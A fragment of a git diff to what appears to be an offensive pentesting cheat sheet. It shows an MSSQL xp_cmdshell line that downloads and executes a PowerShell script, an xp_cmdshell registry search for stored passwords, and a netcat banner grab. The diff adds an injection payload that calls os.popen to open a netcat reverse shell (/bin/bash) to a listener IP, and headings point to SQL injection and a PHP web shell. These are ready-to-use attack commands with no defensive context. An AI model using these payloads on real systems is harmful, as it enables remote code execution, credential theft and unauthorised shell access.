@@ -93,15 +93,10 @@ SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http:
 FIND PASSWORDS
 xp_cmdshell "reg query HKLM /f pass /t REG_SZ /s"
 ```
-
-
-
 ##### Banner Grabbing
 ```
 nc -nv 192.168.64.54 24007
 ```
-
-
 # SQLi 
 ##### Oracle
 ```bash
@@ -230,6 +225,9 @@ Content-Length: 8
 Content-Type: application/x-www-form-urlencoded
 
 code=123
+```
+```
+code={os.popen("nc -e /bin/bash 192.168.49.209 50000").read()}
 ```
 # Simple and Obfuscate PHP Web Shell
 
